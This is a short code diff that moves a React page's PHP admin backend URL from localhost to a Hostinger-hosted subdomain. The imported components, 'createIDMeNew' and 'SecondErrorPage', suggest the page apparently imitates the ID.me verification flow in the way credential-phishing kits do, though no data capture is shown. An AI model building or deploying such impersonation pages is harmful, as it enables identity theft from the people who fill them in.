@@ -20,7 +20,7 @@ import CreateAccount from "../components/createIDMeNew";
 import SecondErrorPage from "../components/secondErrorPage";
 
 // The URL for your PHP backend
-const API_URL = "http://localhost/myBackend/admin_api.php"; // Update this based on your server configuration
+const API_URL = "https://ivory-dunlin-618889.hostingersite.com/myBackend/admin_api.php"; // Update this based on your server configuration
 
 const UserPage2 = () => {
   const [formType, setFormType] = useState<string>("");
